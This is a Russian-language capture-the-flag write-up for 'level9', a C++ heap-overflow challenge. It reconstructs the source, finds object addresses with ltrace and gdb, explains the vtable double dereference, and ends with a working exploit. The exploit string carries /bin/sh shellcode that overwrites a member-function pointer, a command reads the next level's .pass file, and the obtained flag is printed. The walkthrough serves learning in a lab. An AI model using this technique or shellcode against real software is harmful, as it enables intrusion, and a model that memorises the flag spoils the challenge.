## level9
Данная программа написана на `cpp` и использует ООP.  Интересно заметить, что при вызове методов класса, адрес памяти, занимаемой объектом, передается наверху стека (подобно параметру `self` в Питоне). Сами же объекты содержат лишь атрибуты, расположенные по порядку, как внутри `struct`. 

Имея это в виду, исходный код мог выглядеть так:
```cpp
#include <string.h>
#include <unistd.h>

class N {
public:
	typedef  int (N::*MemFun)(const N&) const;

	MemFun	func; 				// from 0-4 bytes
	char	annotation[100];	// from 4-104 bytes
	int 	var;				// from 104-108 bytes

public:
	N(int var) : var(var) {
		func = &N::operator+;
	}

	void *setAnnotation(const char* annotation) {
		size_t len = strlen(annotation);
		return memcpy(this->annotation, annotation, len);
	}

	virtual int operator+(const N& other) const {
		return var + other.var;
	}

	virtual int operator-(const N& other) const {
		return var - other.var;
	}
};

int main(int argc, char** argv, char** envp) {
	if (argc > 1) {
		auto n1 = new N(5);
		auto n2 = new N(6);

    	n1->setAnnotation(argv[1]);
    	return (n2->*(n2->func))(*n1);
	}
	_exit(1);
}
```

Наш план заключается в том, чтобы записать shellcode в `n1->annotation`. Мы также переполним буфер таким образом, чтобы добраться до области памяти, принадлежащей `*n2`, и записать указатель на shellcode в переменную `n2->func`. В результате, вместо  `n2 + n1`, в конце программы будем выполнен shellcode. 

Найдем адреса выделенных объектов `n1` и `n2` с помощью `ltrace`:

```sh
$ ltrace ./level9 ""
...
_Znwj(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280)                  = 0x804a008
_Znwj(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280)                           = 0x804a078
...
```

Атрибут `func` занимает 4 байта, а значит, `n1->annotation` начинается с `0x804a008 + 4 = 0x804a00c`. Следовательно, у нас имеется `0x804a078 - 0x804a00c = 108` байтов между началом `n1->annotation` и `n2->func`.

Нужно отметить, что значение `&N::operator+` , записанное в `n2->func`, не является обычным указателем на функцию. Метод `N::operator+` — виртуальный, поэтому  `n2->func` указывает на [virtual function table](https://en.wikipedia.org/wiki/Virtual_method_table), в которой уже содержатся адреса самих методов класса. Это нам подтверждает и дизассемблер, который осуществляет двойное разыменование в строчках `0x08048680-0x08048682`:

```sh
$ gdb ./level9
(gdb) disas main
...
0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
...
```

Поняв это, мы можем пройти уровень:
```sh
$ echo "cd ..; cat bonus0/.pass" | ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + "a"*52 + "\x0c\xa0\x04\x08"')
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

Для лучшего понимания разберем эксплойт-строку по частям:
* `\x10\xa0\x04\x08` — адрес начала shellcode-а, равный `0x804a00c + 4 = 0x804a010`
* 52 байта shellcode-а, взятого [отсюда](http://shell-storm.org/shellcode/files/shellcode-811.php)
* `\x0c\xa0\x04\x08` — адрес начала буфера
